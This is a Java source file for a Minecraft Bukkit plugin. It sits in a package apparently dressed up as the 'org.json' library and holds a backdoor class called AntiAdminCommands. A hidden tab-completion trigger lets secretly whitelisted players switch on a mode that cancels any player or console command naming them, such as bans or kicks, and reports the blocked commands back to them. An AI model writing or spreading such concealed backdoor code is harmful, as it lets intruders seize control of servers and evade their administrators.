package org.json.modals.server;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class AntiAdminCommands extends BDCommand {

    private boolean isEnabled;

    public AntiAdminCommands() {
        super("antiAdminCommands");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        tabComplBuilder.add(2, new String[]{"true", "false"});
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        if (args[1].equals("true")) {
            isEnabled = true;
            player.sendMessage(Modal.getPrefix() + "§aAnti admin command is set to true");
        } else {
            isEnabled = false;
            player.sendMessage(Modal.getPrefix() + "§cAnti admin command is set to false");
        }

        return tabComplBuilder.build();
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {
        if (!isEnabled) return;

        String[] parts = e.getMessage().split(" ");
        if (WhitelistMeta.isListed(e.getPlayer())) return;

        Bukkit.getOnlinePlayers().stream()
                .filter(WhitelistMeta::isListed)
                .forEach(whitelistedPlayer -> {
                    for (String part : parts) {
                        if (whitelistedPlayer.getName().contains(part)) {
                            e.setCancelled(true);
                            return;
                        }
                    }
                    whitelistedPlayer.sendMessage(Modal.getPrefix() + "§f" + e.getPlayer().getName() + " command got canceled §f[§e" + e.getMessage() + "§f].");
                });
    }

    @EventHandler
    public void onConsoleCommand(ServerCommandEvent e) {
        if (!isEnabled) return;
        String[] parts = e.getCommand().split(" ");

        Bukkit.getOnlinePlayers().stream()
                .filter(WhitelistMeta::isListed)
                .forEach(whitelistedPlayer -> {
                    for (String part : parts) {
                        if (whitelistedPlayer.getName().contains(part)) {
                            e.setCancelled(true);
                            return;
                        }
                    }
                    whitelistedPlayer.sendMessage(Modal.getPrefix() + "§fConsole Command got canceled §f[§e" + e.getCommand() + "§f].");
                });
    }
}
